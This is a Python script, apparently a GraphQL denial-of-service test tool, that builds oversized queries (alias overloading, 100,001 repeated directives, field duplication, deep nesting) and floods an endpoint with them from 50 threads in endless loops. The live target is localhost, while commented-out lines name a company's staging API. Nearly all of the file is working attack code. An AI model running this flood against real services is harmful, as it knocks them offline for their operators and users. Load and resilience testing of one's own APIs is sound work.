import time
import requests
from concurrent.futures import ThreadPoolExecutor

# GRAPHQL_ENDPOINT = "https://foxden-stage.api.foxquilt.com/ratingquoting/2022-06-30/graphql"
# REFERER = "https://join-stage.foxquilt.com/"
# ORIGIN = "https://join-stage.foxquilt.com"

GRAPHQL_ENDPOINT = "http://localhost:4002/local/2022-06-30/graphql"
REFERER = "http://localhost:4002/"
ORIGIN = "http://localhost:4002"

def generate_alias_overloading_query(n_aliases=100):
  aliases = "\n".join([
    f"alias{i}: __typename"
    for i in range(n_aliases)
  ])

  query = f"""query {{
{aliases}
}}"""
  return query

def generate_directive_overloading_query(m_directives=50):
    directives = " ".join([f"@skip(if: false)" for _ in range(m_directives)])
    query = f"""query {{
 __typename {directives}
}}"""
    return query

def generate_field_duplication_query(n_fields=100):
    fields = "\n".join(["__typename" for _ in range(n_fields)])
    query = f"""query {{
{fields}
}}"""
    return query

def generate_deep_query(depth=10):
    query = "query {\n"
    for i in range(depth):
        query += "  " * i + f"level{i} {{\n"
    query += "  " * depth + "__typename\n"
    for i in range(depth):
        query += "  " * (depth - i - 1) + "}\n"
    query += "}"
    return query

def send_graphql_request(query):
  headers = {
    "Content-Type": "application/json",
    "Referer": REFERER,
    "Origin": ORIGIN
  }
  payload = {
    "query": query,
  }
  start_time = time.time() # Start measuring time
  response = requests.post(GRAPHQL_ENDPOINT, json=payload, headers=headers)
  elapsed_time = time.time() - start_time # End measuring time
  return response, elapsed_time

def attack(query):
   while True:
     try:
       resp, elapsed = send_graphql_request(query)
       print(f"Status Code: {resp.status_code}, Time Taken: {elapsed:.4f} seconds")
     except Exception as e:
       print(f"Error occurred: {e}")

def main():
  # # 1) Deep Query
  # print("[*] Sending Deep Query...")
  # deep_query = generate_deep_query(depth=10)
  # resp_deep, time_deep = send_graphql_request(deep_query)
  # print("Status Code:", resp_deep.status_code)
  # print("Response:", "..." + resp_deep.text[-300:]) # Truncate for readability
  # print(f"Time Taken (Deep Query): {time_deep:.4f} seconds\n")

  # 2) Directive Overloading
  # May fail validation if repeated directives are not allowed.
  print("[*] Sending Directive Overloading Query...")
  directive_query = generate_directive_overloading_query(m_directives=100001)
  with ThreadPoolExecutor(max_workers=50) as executor:
    for _ in range(50):
      executor.submit(attack, directive_query)
  

  # 3) Field Duplication
  # print("[*] Sending Field Duplication Query...")
  # field_dup_query = generate_field_duplication_query(n_fields=100100)
  # print("Generating Payload..")
  # resp_field_dup, time_field_dup = send_graphql_request(field_dup_query)
  # print("Status Code:", resp_field_dup.status_code)
  # print("Response:", resp_field_dup.text) # Truncate for readability
  # print(f"Time Taken (Field Duplication): {time_field_dup:.4f} seconds\n")

  # 4) Alias Overloading
  # print("[*] Sending Alias Overloading Query...")
  # alias_query = generate_alias_overloading_query(n_aliases=100000)
  # print("Generating Payload..")
  # resp_alias, time_alias = send_graphql_request(alias_query)
  # print("Status Code:", resp_alias.status_code)
  # print("Response:", resp_alias.text) # Truncate for readability
  # print(f"Time Taken (Alias Overload): {time_alias:.4f} seconds\n")

if __name__ == "__main__":
  main()


